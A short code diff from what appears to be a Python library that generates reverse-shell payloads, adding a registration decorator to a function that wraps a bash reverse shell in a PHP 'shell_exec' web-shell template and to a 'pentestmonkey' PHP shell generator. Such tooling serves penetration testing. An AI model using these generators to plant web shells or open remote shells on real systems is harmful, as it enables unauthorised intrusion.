@@ -1,9 +1,11 @@
 __all__ = ['reverse_bash', 'pentestmonkey']
 
 from revshell.cmd.unix import reverse_bash as bash_cmd
+from revshell.formatters import register
 from revshell.util import kwdefaults_from
 
 
+@register
 @kwdefaults_from(bash_cmd)
 def reverse_bash(lhost: str, lport: int, **kwargs) -> str:
     from revshell.php import php_adapter
@@ -12,6 +14,7 @@ def reverse_bash(lhost: str, lport: int, **kwargs) -> str:
         "<pre><?= shell_exec({!p}) ?></pre>", bash_cmd(lhost, lport, **kwargs)
     )
 
+@register
 def pentestmonkey(
     lhost: str,
     lport: int,
